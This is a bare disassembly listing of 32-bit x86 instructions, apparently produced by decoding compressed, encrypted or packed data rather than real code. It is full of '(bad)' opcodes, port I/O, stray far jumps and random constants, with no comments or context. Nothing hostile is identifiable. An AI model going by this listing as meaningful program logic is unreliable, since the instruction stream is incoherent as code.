  4c4f00:	into   
  4c4f01:	mov    ebx,0x5ac305df
  4c4f06:	outs   dx,DWORD PTR ds:[esi]
  4c4f07:	(bad)  
  4c4f08:	dec    ebp
  4c4f09:	cmp    esi,DWORD PTR [esi+ebp*4-0x8]
  4c4f0d:	mov    al,0x7a
  4c4f0f:	xchg   DWORD PTR [edi+0x6273a363],esi
  4c4f15:	ror    DWORD PTR [esi-0x52],0x7e
  4c4f19:	push   eax
  4c4f1a:	ins    BYTE PTR es:[edi],dx
  4c4f1b:	jg     0x4c4f14
  4c4f1d:	dec    eax
  4c4f1e:	ret    0x2ac7
  4c4f21:	pop    es
  4c4f22:	adc    esp,DWORD PTR [ecx-0x7a]
  4c4f25:	test   bh,ah
  4c4f27:	sbb    eax,0x433f68b0
  4c4f2c:	mov    ds:0xef04c70,al
  4c4f31:	fdiv   DWORD PTR [ecx]
  4c4f33:	xlat   BYTE PTR ds:[ebx]
  4c4f34:	inc    edi
  4c4f35:	dec    ebx
  4c4f36:	push   cs
  4c4f37:	jns    0x4c4eee
  4c4f39:	sub    DWORD PTR [ecx],0x56
  4c4f3c:	fwait
  4c4f3d:	scas   eax,DWORD PTR es:[edi]
  4c4f3e:	xor    eax,0x66b24f97
  4c4f43:	stos   DWORD PTR es:[edi],eax
  4c4f44:	popa   
  4c4f45:	dec    ebx
  4c4f46:	inc    edi
  4c4f47:	je     0x4c4f6b
  4c4f49:	jbe    0x4c4f66
  4c4f4b:	mov    eax,ds:0x5c87f723
  4c4f50:	adc    BYTE PTR [esi+0x26af54a7],ch
  4c4f56:	mov    ch,0x86
  4c4f58:	adc    eax,0x5f17cb4f
  4c4f5d:	pop    edx
  4c4f5e:	add    eax,0x8bb79560
  4c4f63:	add    BYTE PTR [esi+0x3783ca8d],ah
  4c4f69:	dec    ecx
  4c4f6a:	mov    dh,0x66
  4c4f6c:	add    DWORD PTR [edi+0x63],ebx
  4c4f6f:	push   DWORD PTR [edi]
  4c4f71:	mov    ecx,0x488ee9a5
  4c4f76:	ror    bh,cl
  4c4f78:	mov    esi,0x16310023
  4c4f7d:	aad    0x83
  4c4f7f:	add    ecx,DWORD PTR [ebp-0x69]
  4c4f82:	jne    0x4c4fa3
  4c4f84:	inc    ebx
  4c4f85:	inc    esp
  4c4f86:	add    ebp,ecx
  4c4f88:	dec    edi
  4c4f89:	xor    ch,BYTE PTR [ebx]
  4c4f8b:	push   edi
  4c4f8c:	ds add al,0x4c
  4c4f8f:	jo     0x4c4f4f
  4c4f91:	add    esi,DWORD PTR [ebx+ecx*4-0x7a]
  4c4f95:	popf   
  4c4f96:	neg    ebp
  4c4f98:	jecxz  0x4c4ffe
  4c4f9a:	push   ebx
  4c4f9b:	push   esp
  4c4f9c:	es js  0x4c4fee
  4c4f9f:	push   ebx
  4c4fa0:	cmp    BYTE PTR ds:0x6a2770a2,ch
  4c4fa6:	ficomp DWORD PTR [ebx-0x22]
  4c4fa9:	(bad)  
  4c4fab:	push   esi
  4c4fac:	jb     0x4c4ff5
  4c4fae:	addr16 jmp 0x5723:0x4de0205a
  4c4fb6:	add    DWORD PTR [ebx-0x26],0xca6731e4
  4c4fbd:	inc    esi
  4c4fbe:	rcr    BYTE PTR [ebx+0x6d],1
  4c4fc1:	shr    BYTE PTR [ebx+0x67],cl
  4c4fc4:	push   ss
  4c4fc5:	mov    esp,edx
  4c4fc7:	add    edx,edi
  4c4fc9:	pop    edi
  4c4fca:	push   edi
  4c4fcb:	push   edi
  4c4fcc:	adc    BYTE PTR [bx-0x74],ch
  4c4fd0:	sbb    edi,ebx
  4c4fd2:	push   0xffffffb6
  4c4fd4:	jne    0x4c5037
  4c4fd6:	jo     0x4c4f7f
  4c4fd8:	xchg   edi,eax
  4c4fd9:	dec    edi
  4c4fda:	mov    ch,0x18
  4c4fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c4fdd:	add    eax,0x671f52f7
  4c4fe2:	add    BYTE PTR [edi-0x5b],dh
  4c4fe5:	inc    edi
  4c4fe6:	and    al,0x6
  4c4fe8:	cmp    BYTE PTR cs:[ebp+0x5b0f75d3],0x6
  4c4ff0:	adc    al,BYTE PTR [edx]
  4c4ff2:	nop    DWORD PTR cs:[eax+0x5727c042]
  4c4ffa:	dec    ecx
  4c4ffb:	or     DWORD PTR [eax+0x44b7010e],ebx
  4c5001:	adc    BYTE PTR ds:0xb3271120,0x27
  4c5008:	shr    BYTE PTR [eax],0xb4
  4c500b:	loop   0x4c507f
  4c500d:	cmp    ebx,edi
  4c500f:	das    
  4c5010:	add    al,0xac
  4c5012:	dec    edx
  4c5013:	mov    ebx,0x70096543
  4c5018:	fisttp WORD PTR ds:0x508b63bf
  4c501e:	inc    ebx
  4c501f:	inc    ebx
  4c5020:	rol    BYTE PTR [esp+edx*2-0x75bdb012],0x4
  4c5028:	sbb    al,0xa5
  4c502a:	scas   eax,DWORD PTR es:[edi]
  4c502b:	scas   eax,DWORD PTR es:[edi]
  4c502c:	and    edi,DWORD PTR [edi]
  4c502e:	data16 or BYTE PTR [edi+0x42],ch
  4c5032:	out    0xb7,eax
  4c5034:	dec    ecx
  4c5035:	inc    ebx
  4c5036:	dec    ebp
  4c5037:	push   eax
  4c5038:	aam    0x1b
  4c503a:	cli    
  4c503b:	imul   DWORD PTR [esi]
  4c503d:	inc    esp
  4c503e:	dec    esp
  4c503f:	dec    esp
  4c5040:	pop    ss
  4c5041:	arpl   WORD PTR [ebp+0x70],bp
  4c5044:	inc    ebx
  4c5045:	dec    ecx
  4c5046:	inc    esi
  4c5047:	jmp    0x141f:0x90233690
  4c504e:	gs pop ecx
  4c5050:	jmp    0x1f20:0x647ec9ae
  4c5057:	push   ebx
  4c5058:	inc    ecx
  4c5059:	fadd   QWORD PTR [ecx-0x44]
  4c505c:	or     al,BYTE PTR [ebp+0x63]
  4c505f:	push   0xe9464f6f
  4c5064:	adc    al,0xd0
  4c5066:	int3   
  4c5067:	(bad)  
  4c5068:	push   edx
  4c5069:	pop    esp
  4c506a:	xchg   edi,eax
  4c506b:	xor    edi,0xffffffc2
  4c506e:	add    BYTE PTR [esi+0x249627ca],ch
  4c5074:	mov    dh,0xef
  4c5076:	or     DWORD PTR [ebx-0x75f0a3e1],ebp
  4c507c:	shl    BYTE PTR [ebx-0x8],0x4f
  4c5080:	scas   eax,DWORD PTR es:[edi]
  4c5081:	and    ecx,DWORD PTR [edx+ebx*1+0x24]
  4c5085:	mov    WORD PTR [edi+0x52],?
  4c5088:	push   eax
  4c5089:	or     al,BYTE PTR [edx]
  4c508b:	das    
  4c508c:	sbb    al,0xe3
  4c508e:	retf   0x6653
  4c5091:	add    BYTE PTR [ebx],ch
  4c5093:	ret    0x2b9f
  4c5096:	adc    DWORD PTR [ebx+eax*1-0x48],0x2e
  4c509b:	mov    bl,0x97
  4c509d:	jo     0x4c50ba
  4c509f:	mov    edx,0x721b4b87
  4c50a4:	xor    ebp,DWORD PTR [edx+0x2ef6c259]
  4c50aa:	rol    DWORD PTR [ebx+0x7607deb3],cl
  4c50b0:	lods   al,BYTE PTR ds:[esi]
  4c50b1:	xor    ebp,DWORD PTR [edi-0x2]
  4c50b4:	daa    
  4c50b5:	pop    edi
  4c50b6:	jo     0x4c5041
  4c50b8:	adc    eax,0x1e272304
  4c50bd:	or     BYTE PTR [esi+edx*4+0x6e208acb],ch
  4c50c4:	test   DWORD PTR [edx],eax
  4c50c6:	(bad)  
  4c50c7:	fld    TBYTE PTR [ebx-0x5d]
  4c50ca:	xor    BYTE PTR [eax-0x4f],cl
  4c50cd:	test   BYTE PTR [edi-0xe],dh
  4c50d0:	gs gs sbb al,0xf2
  4c50d4:	sub    eax,0x699367a0
  4c50d9:	arpl   WORD PTR [esi+0x63],bp
  4c50dc:	mov    eax,0xb72e5725
  4c50e1:	sbb    BYTE PTR [ebx+ebx*2+0x2eaaf3c2],ah
  4c50e8:	dec    ebp
  4c50e9:	add    al,0x8e
  4c50eb:	push   ss
  4c50ec:	cmp    esp,DWORD PTR [esi]
  4c50ee:	ins    BYTE PTR es:[edi],dx
  4c50ef:	mov    al,0xb7
  4c50f1:	imul   BYTE PTR [edi-0x8b7e90d]
  4c50f7:	(bad)  
  4c50f8:	sub    edi,DWORD PTR [ecx+0x70]
  4c50fb:	test   esi,ebp
  4c50fd:	jae    0x4c50de
  4c50ff:	jo     0x4c513d
  4c5101:	dec    ecx
  4c5102:	dec    eax
  4c5103:	sub    DWORD PTR [ebp+0x37],0xae255cff
  4c510a:	add    DWORD PTR [ebx],esi
  4c510c:	mov    edi,0x70704527
  4c5111:	jo     0x4c50ae
  4c5113:	daa    
  4c5114:	cmp    edi,DWORD PTR [edi]
  4c5116:	outs   dx,DWORD PTR ds:[esi]
  4c5117:	mov    al,0xe1
  4c5119:	or     dh,BYTE PTR [ebx-0x7f6c68e0]
  4c511f:	cmovnp eax,DWORD PTR [eax]
  4c5122:	and    al,BYTE PTR [ebx-0x1f09fcbb]
  4c5128:	jnp    0x4c517d
  4c512a:	ins    DWORD PTR es:[edi],dx
  4c512b:	daa    
  4c512c:	addr16 aas 
  4c512e:	pop    edi
  4c512f:	aaa    
  4c5130:	mov    cl,0xd8
  4c5132:	add    DWORD PTR [esi+ecx*2+0x2dd897bb],0x6b23c121
  4c513d:	push   ecx
  4c513e:	cmp    bl,ah
  4c5140:	xchg   ebx,eax
  4c5141:	dec    edi
  4c5142:	ret    0x1d21
  4c5145:	das    
  4c5146:	cmp    al,0xa3
  4c5148:	push   esi
  4c5149:	cs jo  0x4c51b6
  4c514c:	sbb    edx,DWORD PTR [edx]
  4c514e:	sbb    esi,DWORD PTR [ebx-0x13b964e9]
  4c5154:	xor    BYTE PTR [esi+0x6e176f1a],0x8b
  4c515b:	xor    BYTE PTR [ebp+0x6f771809],0x77
  4c5162:	inc    edi
  4c5163:	push   es
  4c5164:	adc    al,0x33
  4c5166:	arpl   WORD PTR [esi-0x4d],si
  4c5169:	fs (bad) 
  4c516b:	scas   eax,DWORD PTR es:[edi]
  4c516c:	cli    
  4c516d:	fiadd  WORD PTR [edx]
  4c516f:	aaa    
  4c5170:	dec    ebp
  4c5171:	outs   dx,DWORD PTR ds:[esi]
  4c5172:	fs jne 0x4c51e1
  4c5175:	aaa    
  4c5176:	inc    ebp
  4c5177:	js     0x4c5192
  4c5179:	xor    esp,ecx
  4c517b:	inc    eax
  4c517c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c517d:	retf   
  4c517e:	imul   ebp,DWORD PTR [eax],0x5bb15118
  4c5184:	jecxz  0x4c518d
  4c5186:	pop    ss
  4c5187:	dec    esp
  4c5188:	mov    al,0x40
  4c518a:	or     cl,BYTE PTR [ebx]
  4c518c:	arpl   WORD PTR [edi],ax
  4c518e:	jae    0x4c51e0
  4c5190:	cwde   
  4c5191:	or     ebp,DWORD PTR [ebx+eiz*4-0xe]
  4c5195:	outs   dx,BYTE PTR ds:[esi]
  4c5196:	inc    ebx
  4c5197:	dec    edi
  4c5198:	and    DWORD PTR [edx+0x4f002113],eax
  4c519e:	dec    ebx
  4c519f:	add    al,BYTE PTR [edx+0x4b3b0123]
  4c51a5:	dec    edi
  4c51a6:	mov    edx,0x1e49f004
  4c51ab:	scas   eax,DWORD PTR es:[edi]
  4c51ac:	(bad)  
  4c51ad:	inc    ecx
  4c51ae:	and    BYTE PTR [ebp+0x48],dl
  4c51b1:	cmp    BYTE PTR [edi-0x53],dl
  4c51b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c51b5:	rcl    BYTE PTR [ebp-0x29],0x58
  4c51b9:	pop    ss
  4c51ba:	daa    
  4c51bb:	push   ss
  4c51bc:	push   ss
  4c51bd:	loopne 0x4c515f
  4c51bf:	pop    edi
  4c51c0:	push   eax
  4c51c1:	imul   eax,DWORD PTR [eax],0x43
  4c51c4:	lods   al,BYTE PTR ds:[esi]
  4c51c5:	stos   DWORD PTR es:[edi],eax
  4c51c6:	(bad)  
  4c51c8:	xchg   ebx,eax
  4c51c9:	inc    ebp
  4c51ca:	ret    0x246f
  4c51cd:	dec    esi
  4c51ce:	(bad)  
  4c51cf:	fist   DWORD PTR [ebx-0x53]
  4c51d2:	cwde   
  4c51d3:	or     ch,bl
  4c51d5:	dec    edi
  4c51d6:	inc    ebx
  4c51d7:	dec    ebx
  4c51d8:	out    0xa4,eax
  4c51da:	mov    eax,ds:0x9ef34237
  4c51df:	sbb    DWORD PTR [edx+0x44],ebx
  4c51e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c51e3:	jecxz  0x4c51f4
  4c51e5:	jne    0x4c5239
  4c51e7:	cmp    cl,ch
  4c51e9:	outs   dx,DWORD PTR ds:[esi]
  4c51ea:	pop    esi
  4c51eb:	aas    
  4c51ec:	pusha  
  4c51ed:	ins    DWORD PTR es:[edi],dx
  4c51ee:	sub    eax,0x2f333fb4
  4c51f3:	add    BYTE PTR [esi],cl
  4c51f5:	add    DWORD PTR [edi],0x78175b5b
  4c51fb:	imul   ecx,DWORD PTR [edi+ecx*8-0x7984ac86],0x72276906
  4c5206:	aaa    
  4c5207:	daa    
  4c5208:	inc    eax
  4c5209:	lods   al,BYTE PTR ds:[esi]
  4c520a:	add    DWORD PTR [eax+0xf],ebx
  4c520d:	push   es
  4c520e:	loopne 0x4c5228
  4c5210:	pop    eax
  4c5211:	imul   edx,DWORD PTR [edi-0x6d],0x2
  4c5215:	pop    edi
  4c5216:	js     0x4c51ee
  4c5218:	ret    
  4c5219:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c521a:	inc    edx
  4c521b:	pusha  
  4c521c:	in     eax,dx
  4c521d:	pop    ebp
  4c521e:	scas   eax,DWORD PTR es:[edi]
  4c521f:	and    ebx,DWORD PTR [edi-0x61]
  4c5222:	lods   eax,DWORD PTR ds:[esi]
  4c5223:	aaa    
  4c5224:	cs mov ch,0x93
  4c5227:	rol    bl,cl
  4c5229:	shl    dh,0x46
  4c522c:	packuswb mm2,QWORD PTR [edi-0x596a3fc0]
  4c5233:	das    
  4c5234:	dec    ebx
  4c5235:	scas   eax,DWORD PTR es:[edi]
  4c5236:	inc    edi
  4c5237:	pop    esp
  4c5238:	push   0x1a3fb3a1
  4c523d:	repnz pop ebp
  4c523f:	(bad)  
  4c5240:	cmp    DWORD PTR [eax+0x37],esp
  4c5243:	dec    eax
  4c5244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c5245:	(bad)  
  4c5246:	jbe    0x4c5279
  4c5248:	mov    ah,0x37
  4c524a:	push   edi
  4c524b:	mov    ds:0xc6edbd6f,eax
  4c5250:	repnz imul edi,DWORD PTR [esi+0x0],0xf
  4c5255:	daa    
  4c5256:	adc    DWORD PTR ss:[eax],eax
  4c5259:	pop    ss
  4c525a:	call   DWORD PTR [eax+0x73]
  4c525d:	xor    al,0x2f
  4c525f:	inc    eax
  4c5260:	cs nop
  4c5262:	or     esi,DWORD PTR [ebx]
  4c5264:	xor    ah,BYTE PTR [edx+0x67b12e24]
  4c526a:	out    0xe2,eax
  4c526c:	add    al,0x42
  4c526e:	(bad)  
  4c526f:	not    ebx
  4c5271:	mov    BYTE PTR [ebp+0x4f42c206],0xc4
  4c5278:	push   ebx
  4c5279:	pop    es
  4c527a:	inc    edi
  4c527b:	push   edi
  4c527c:	push   edi
  4c527d:	pop    esi
  4c527e:	bound  ebx,QWORD PTR [ebx]
  4c5280:	sub    al,ch
  4c5282:	(bad)  
  4c5283:	push   ds
  4c5284:	sbb    esp,DWORD PTR [edx+0x3]
  4c5287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c5288:	push   0x1f
  4c528a:	mov    dl,BYTE PTR [edi-0x4c]
  4c528d:	and    ecx,DWORD PTR [ebx-0x2d]
  4c5290:	imul   ebx,DWORD PTR [edi],0x6b
  4c5293:	jmp    0x203dd60e
  4c5298:	mov    bh,0x4b
  4c529a:	aaa    
  4c529b:	inc    edx
  4c529c:	jo     0x4c523f
  4c529e:	pusha  
  4c529f:	mov    ebx,0x3f1f44cf
  4c52a4:	daa    
  4c52a5:	jne    0x4c52ef
  4c52a7:	lods   al,BYTE PTR ds:[esi]
  4c52a8:	or     bh,BYTE PTR [edi-0xd]
  4c52ab:	gs pusha 
  4c52ad:	sbb    eax,0x5f47ab8f
  4c52b2:	ficomp DWORD PTR [edx]
  4c52b4:	mov    ebp,edx
  4c52b6:	fistp  QWORD PTR [edi+0x47]
  4c52b9:	mov    dh,0x63
  4c52bb:	mov    cl,0x17
  4c52bd:	jae    0x4c52e6
  4c52bf:	mov    bh,0x57
  4c52c1:	lods   eax,DWORD PTR ds:[esi]
  4c52c2:	sub    BYTE PTR [edi],dl
  4c52c4:	mov    es,WORD PTR [esi+0x7f]
  4c52c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c52c8:	sub    ch,BYTE PTR [eax-0x2b]
  4c52cb:	out    dx,ax
  4c52cd:	(bad)  
  4c52ce:	cmp    ebx,DWORD PTR [esi]
  4c52d0:	push   esi
  4c52d1:	dec    ebx
  4c52d2:	mov    al,0x33
  4c52d4:	inc    edi
  4c52d5:	add    ecx,DWORD PTR [edi]
  4c52d7:	shl    BYTE PTR [edi],cl
  4c52d9:	or     al,0xb3
  4c52db:	adc    esp,edi
  4c52dd:	ins    DWORD PTR es:[edi],dx
  4c52de:	pop    ebx
  4c52df:	lods   eax,DWORD PTR ds:[esi]
  4c52e0:	scas   eax,DWORD PTR es:[edi]
  4c52e1:	pop    edi
  4c52e2:	push   ebx
  4c52e3:	push   edi
  4c52e4:	daa    
  4c52e5:	pop    ds
  4c52e6:	sar    al,1
  4c52e8:	xchg   edx,eax
  4c52e9:	sbb    ebp,DWORD PTR [edi+0x1a0aa13]
  4c52ef:	mov    ebx,0xa7374c53
  4c52f4:	mov    ecx,edx
  4c52f6:	xchg   BYTE PTR [esi],dh
  4c52f8:	inc    edi
  4c52f9:	inc    ecx
  4c52fa:	daa    
  4c52fb:	add    eax,0x532ec4bb
  4c5300:	jnp    0x4c5374
  4c5302:	dec    edi
  4c5303:	pop    es
  4c5304:	in     al,dx
  4c5305:	sub    BYTE PTR [ecx+0x414744b7],ah
  4c530b:	test   al,0x0
  4c530d:	push   ss
  4c530e:	enter  0x5800,0x2f
  4c5312:	push   0x2fde00ab
  4c5317:	xchg   edi,eax
  4c5318:	lahf   
  4c5319:	inc    edx
  4c531a:	pop    ebx
  4c531b:	push   esp
  4c531c:	shl    BYTE PTR [ebx],cl
  4c531e:	aas    
  4c531f:	jbe    0x4c5321
  4c5321:	ins    BYTE PTR es:[edi],dx
  4c5322:	ficomp DWORD PTR [edi]
  4c5324:	pop    es
  4c5325:	aas    
  4c5326:	mov    bh,0x83
  4c5328:	mov    ah,0x51
  4c532a:	mov    al,0x1f
  4c532c:	das    
  4c532d:	xchg   esi,eax
  4c532e:	pusha  
  4c532f:	dec    esp
  4c5330:	shr    BYTE PTR [edx+0x2f],0x17
  4c5334:	or     ebx,eax
  4c5336:	mov    cl,0x4a
  4c5338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c5339:	push   edi
  4c533a:	lods   al,BYTE PTR ds:[esi]
  4c533b:	imul   edi,DWORD PTR [ebx+0x2b368355],0xffffffef
  4c5342:	pop    es
  4c5343:	xor    al,0x92
  4c5345:	add    al,BYTE PTR [esi+0x54]
  4c5348:	fwait
  4c5349:	and    eax,0x6706f62c
  4c534e:	das    
  4c534f:	mov    bh,0x26
  4c5351:	arpl   bx,bx
  4c5353:	repz aaa 
  4c5355:	xlat   BYTE PTR ds:[ebx]
  4c5356:	(bad)  
  4c5357:	sbb    ah,BYTE PTR [ebp-0x102c4b80]
  4c535d:	mov    dh,0xa
  4c535f:	mov    al,0xa5
  4c5361:	mov    ebx,0x122f5733
  4c5366:	js     0x4c537c
  4c5368:	nop
  4c5369:	pop    ss
  4c536a:	add    al,0x1c
  4c536c:	lods   al,BYTE PTR ds:[esi]
  4c536d:	mov    dh,0xeb
  4c536f:	jmp    FWORD PTR [edi]
  4c5371:	pop    edx
  4c5372:	mov    al,ds:0x4f27dcc0
  4c5377:	inc    edi
  4c5378:	dec    edi
  4c5379:	pusha  
  4c537a:	mov    ch,0x55
  4c537c:	mov    al,0x5f
  4c537e:	dec    ebx
  4c537f:	or     bl,BYTE PTR [eax-0x688854a0]
  4c5385:	inc    esp
  4c5386:	adc    eax,0xebedd8ac
  4c538b:	jecxz  0x4c53e1
  4c538d:	dec    edi
  4c538e:	fbld   TBYTE PTR [eax-0x57]
  4c5391:	pusha  
  4c5392:	mov    ch,0x47
  4c5394:	test   DWORD PTR [edi+0x2d],0x29083b5
  4c539b:	out    0x3f,eax
  4c539d:	nop
  4c539e:	push   0x60
  4c53a0:	sub    eax,0x4b90df6b
  4c53a5:	sub    eax,0xbb43f744
  4c53aa:	fsubp  st(1),st
  4c53ac:	(bad)  
  4c53ad:	out    dx,al
  4c53ae:	aas    
  4c53af:	push   edi
  4c53b0:	pop    ss
  4c53b1:	das    
  4c53b2:	inc    ebp
  4c53b3:	xchg   DWORD PTR [eax-0x5d],ebx
  4c53b6:	mov    ch,0xdb
  4c53b8:	mov    ebx,0x55bf3f0e
  4c53bd:	aas    
  4c53be:	in     al,dx
  4c53bf:	push   cs
  4c53c0:	mov    ebp,fs
  4c53c2:	dec    ecx
  4c53c3:	inc    ebx
  4c53c4:	push   ds
  4c53c5:	adc    eax,DWORD PTR [edx]
  4c53c7:	push   ebx
  4c53c8:	mov    cl,0x71
  4c53ca:	add    BYTE PTR [ebx+0x35a1c600],bh
  4c53d0:	adc    BYTE PTR [edi],dh
  4c53d2:	and    eax,0xc4aa61af
  4c53d7:	sub    bh,BYTE PTR [edi]
  4c53d9:	push   DWORD PTR [ebx+0x5a]
  4c53dc:	and    edx,DWORD PTR [edx+0x60]
  4c53df:	inc    ebx
  4c53e0:	out    0x11,eax
  4c53e2:	inc    edi
  4c53e3:	mov    esp,0x477067d7
  4c53e8:	jbe    0x4c5412
  4c53ea:	gs add dh,al
  4c53ed:	fisttp WORD PTR ds:0x8ef6e497
  4c53f3:	je     0x4c53bb
  4c53f5:	xor    ebp,DWORD PTR [edi+0x4d0f5316]
  4c53fb:	loopne 0x4c53e1
  4c53fd:	in     al,0xe4
  4c53ff:	dec    eax
  4c5400:	ins    DWORD PTR es:[edi],dx
  4c5401:	pop    ecx
  4c5402:	push   0x1c
  4c5404:	add    eax,0x38f768cc
  4c5409:	jecxz  0x4c5478
  4c540b:	test   DWORD PTR [eax+0x268b4293],0x231ad213
  4c5415:	cmp    eax,0x8582e6df
  4c541a:	imul   ebp,DWORD PTR [edi+0x15],0xffffffa7
  4c541e:	push   ds
  4c541f:	cmp    BYTE PTR [edi],dl
  4c5421:	xor    ah,BYTE PTR [eax+eiz*2+0x37]
  4c5425:	xor    esi,ebx
  4c5427:	push   edx
  4c5428:	adc    al,BYTE PTR [edi+0x37]
  4c542b:	or     ecx,DWORD PTR [ecx+eax*4-0x54a9c053]
  4c5432:	and    eax,0x4f68e40c
  4c5437:	xor    eax,esi
  4c5439:	shr    DWORD PTR [esi],1
  4c543b:	jbe    0x4c543f
  4c543d:	gs pop ds
  4c543f:	add    BYTE PTR [edi+0x30],ah
  4c5442:	pop    es
  4c5443:	xchg   ebp,eax
  4c5444:	or     ch,BYTE PTR ds:0x16afb7bf
  4c544a:	xlat   BYTE PTR ds:[ebx]
  4c544b:	pop    es
  4c544c:	jne    0x4c54c3
  4c544e:	lahf   
  4c544f:	scas   eax,DWORD PTR es:[edi]
  4c5450:	test   al,0x73
  4c5452:	lds    edx,FWORD PTR [ecx+0x6e237586]
  4c5458:	bound  edi,QWORD PTR [edi]
  4c545a:	xor    eax,0x5c3b6f18
  4c545f:	sub    ebx,DWORD PTR [eax-0x33]
  4c5462:	dec    ecx
  4c5463:	out    dx,eax
  4c5464:	pop    esp
  4c5465:	loop   0x4c54d3
  4c5467:	pop    es
  4c5468:	mov    bh,0x27
  4c546a:	mov    dh,0x8b
  4c546c:	into   
  4c546d:	fwait
  4c546e:	gs lahf 
  4c5470:	cmp    edx,ebx
  4c5472:	and    BYTE PTR [edx],dl
  4c5474:	adc    eax,0x769727d4
  4c5479:	sub    al,0x56
  4c547b:	es mov dh,0x1b
  4c547e:	or     esi,DWORD PTR [edx-0x45]
  4c5481:	es jo  0x4c5484
  4c5484:	jae    0x4c5491
  4c5486:	cmp    BYTE PTR ds:0xc6c18944,ch
  4c548c:	ja     0x4c54bd
  4c548e:	mov    DWORD PTR [ebp+0x71],ebp
  4c5491:	and    ch,BYTE PTR [edi-0x57576ed1]
  4c5497:	aad    0xeb
  4c5499:	lsl    eax,WORD PTR [edi+0x2bffbc06]
  4c54a0:	mov    dh,0x86
  4c54a2:	jo     0x4c54e7
  4c54a4:	gs inc esp
  4c54a6:	imul   esi,DWORD PTR [edx-0x73],0x11845779
  4c54ad:	imul   esi,DWORD PTR [ebx-0x3dff70a1],0x1
  4c54b4:	add    ebx,DWORD PTR [edi]
  4c54b6:	cmp    bl,BYTE PTR [edx+0x78]
  4c54b9:	lods   eax,DWORD PTR ds:[esi]
  4c54ba:	mov    ch,0xe7
  4c54bc:	xchg   DWORD PTR [ecx+0x27],ebp
  4c54bf:	and    DWORD PTR [ecx+0x4],0x7630f1e
  4c54c6:	jne    0x4c5455
  4c54c8:	loope  0x4c5512
  4c54ca:	xchg   ebx,eax
  4c54cb:	or     esp,edi
  4c54cd:	dec    eax
  4c54ce:	pop    es
  4c54cf:	rol    BYTE PTR [eax+0x4d],cl
  4c54d2:	maxps  xmm6,XMMWORD PTR [ebx+0x30bed87f]
  4c54d9:	les    ebp,FWORD PTR [esi-0x4b6ab061]
  4c54df:	fadd   DWORD PTR [ecx-0x2a]
  4c54e2:	stos   DWORD PTR es:[di],eax
  4c54e4:	(bad)  
  4c54e5:	cmp    BYTE PTR [edi+0x1b],cl
  4c54e8:	xchg   BYTE PTR [ebx+0x52],dl
  4c54eb:	mov    dh,0x56
  4c54ed:	mov    ds:0x9247f0bd,eax
  4c54f2:	pop    edi
  4c54f3:	mov    bh,0xd8
  4c54f5:	jno    0x4c54d4
  4c54f7:	scas   al,BYTE PTR es:[edi]
  4c54f8:	push   edx
  4c54f9:	fistp  WORD PTR [esi]
  4c54fb:	mov    edi,0xdb16747
  4c5500:	mov    esp,esp
  4c5502:	inc    ebx
  4c5503:	stos   DWORD PTR es:[edi],eax
  4c5504:	pop    edi
  4c5505:	mov    cs,WORD PTR ds:0x3f55c85b
  4c550b:	push   ebx
  4c550c:	das    
  4c550d:	push   ebp
  4c550e:	cmp    DWORD PTR [ebp+0x5f4780e1],eax
  4c5514:	scas   eax,DWORD PTR es:[edi]
  4c5515:	mov    ch,0x27
  4c5517:	pop    esp
  4c5518:	add    esp,DWORD PTR [edi-0x62]
  4c551b:	pop    edx
  4c551c:	aaa    
  4c551d:	mov    ecx,DWORD PTR [eax]
  4c551f:	lods   al,BYTE PTR ds:[esi]
  4c5520:	mov    ebp,0x6dc71f1b
  4c5525:	mov    cl,0x71
  4c5527:	mov    ch,0x49
  4c5529:	aaa    
  4c552a:	inc    esp
  4c552b:	pop    ss
  4c552c:	daa    
  4c552d:	mov    ds:0x51725606,al
  4c5532:	xchg   edi,eax
  4c5533:	aas    
  4c5534:	bound  eax,QWORD PTR [ebx]
  4c5536:	jmp    DWORD PTR [ecx+0x64]
  4c5539:	jbe    0x4c559c
  4c553b:	jo     0x4c55a6
  4c553d:	inc    edi
  4c553e:	push   edx
  4c553f:	gs addr16 inc esp
  4c5542:	ds je  0x4c5548
  4c5545:	or     DWORD PTR [ebx],ebx
  4c5547:	dec    ebx
  4c5548:	gs jns 0x4c5533
  4c554b:	sub    edx,DWORD PTR [edx-0x11]
  4c554e:	xchg   DWORD PTR ss:[edi+0x2d],ebx
  4c5552:	movntps XMMWORD PTR [edi],xmm2
  4c5555:	pop    edi
  4c5556:	aas    
  4c5557:	shl    bh,0xcf
  4c555a:	pop    ebx
  4c555b:	or     ebp,DWORD PTR [esi+0x17]
  4c555e:	pop    ebp
  4c555f:	add    BYTE PTR [esi+edx*4+0x25],bh
  4c5563:	out    dx,eax
  4c5564:	imul   eax
  4c5566:	jge    0x4c5573
  4c5568:	pop    ebx
  4c5569:	inc    edx
  4c556a:	sub    ecx,DWORD PTR [ebx+0x23]
  4c556d:	cs aas 
  4c556f:	add    BYTE PTR [eax],ch
  4c5571:	and    dh,BYTE PTR [eax]
  4c5573:	ja     0x4c55be
  4c5575:	fnstsw WORD PTR [ebx+0x26]
  4c5578:	cmp    DWORD PTR [edx],ebx
  4c557a:	sub    al,BYTE PTR [edx+0x66]
  4c557d:	sub    DWORD PTR [edi],ebp
  4c557f:	mov    ch,0xb1
  4c5581:	mov    ds:0x372e12b5,eax
  4c5586:	cs aas 
  4c5588:	xor    ch,BYTE PTR [eax-0x54]
  4c558b:	xor    eax,esi
  4c558d:	pop    esi
  4c558e:	ja     0x4c55ed
  4c5590:	pop    ss
  4c5591:	and    dh,BYTE PTR [edi+0x70]
  4c5594:	aam    0xfc
  4c5596:	(bad)  
  4c5597:	js     0x4c5599
  4c5599:	pop    eax
  4c559a:	inc    ebp
  4c559b:	pop    edx
  4c559c:	addr16 mov ds:0x3a73,al
  4c55a0:	push   ss
  4c55a1:	and    eax,0xafff1b16
  4c55a6:	pop    ds
  4c55a7:	ror    BYTE PTR [edx],cl
  4c55a9:	loope  0x4c55c6
  4c55ab:	stos   DWORD PTR es:[edi],eax
  4c55ac:	aaa    
  4c55ad:	dec    eax
  4c55ae:	arpl   WORD PTR [ebx+0x6d],sp
